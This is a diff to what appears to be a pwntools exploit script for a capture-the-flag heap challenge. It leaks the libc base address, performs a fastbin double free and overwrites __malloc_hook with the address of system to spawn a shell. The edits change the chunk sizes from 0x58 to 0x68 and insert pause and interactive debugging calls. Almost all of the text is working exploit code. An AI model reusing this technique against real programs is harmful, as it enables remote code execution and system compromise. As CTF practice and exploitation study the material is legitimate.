@@ -54,12 +54,14 @@ r.recvuntil('Note 1:\n  Data: ')
 libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
 print('libc_base --> ', hex(libc_base))
 
-add(0x58, '\xaa' * 8, '\xaa' * 0x30) # n4
-add(0x58, '\xaa' * 8, '\xbb' * 0x30) # n5
+pause()
+add(0x68, '\xaa' * 8, '\xaa' * 0x30) # n4
+add(0x68, '\xaa' * 8, '\xbb' * 0x30) # n5
 delete(4)
 delete(5)
 
 # self-opening another place to do double free shit
+r.interactive()
 delete(2)
 delete(3)
 add(0x18, '\xaa' * 8, '\xaa' * 0x2f) # n4
@@ -67,13 +69,13 @@ add(0x18, '\xaa' * 8, '\xbb' * 0x30) # n5
 delete(4)
 
 malloc_hook = libc_base + libc.sym.__malloc_hook - 0x13# shift for 0x7f like padding
-add(0x58, p64(malloc_hook), 'MALLOC_HOOK')
-add(0x58, '\x18', '\x87' * 48)
-add(0x58, '\x18', '\x87' * 48)
+add(0x68, p64(malloc_hook), 'MALLOC_HOOK')
+add(0x68, '\x18', '\x87' * 48)
+add(0x68, '\x18', '\x87' * 48)
 
 binsh = libc_base + libc.search('/bin/sh').next()
 system = libc_base + libc.sym.system
-add(0x58, p64(system), 'BIN_SH')
+add(0x68, p64(system), 'BIN_SH')
 
 r.recvuntil('>')
 r.sendline('1')
